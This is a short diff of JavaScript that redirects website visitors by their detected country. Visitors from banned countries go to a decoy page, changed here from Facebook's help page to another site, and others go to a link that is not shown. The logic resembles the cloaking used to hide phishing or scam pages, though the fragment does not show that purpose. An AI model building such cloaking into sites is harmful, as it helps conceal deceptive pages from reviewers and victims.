@@ -27,7 +27,7 @@
                 .then(json => {
                     if (banList.includes(json.countryCode)) {
                         // If the user's country code is in the ban list, redirect to Facebook help
-                        window.location.href = "https://www.facebook.com/help";
+                        window.location.href = "https://www.krishvi.com/";
                     } else {
                         if (json.ipAddress) {
                             // If the user's IP address is available, redirect to the specified link
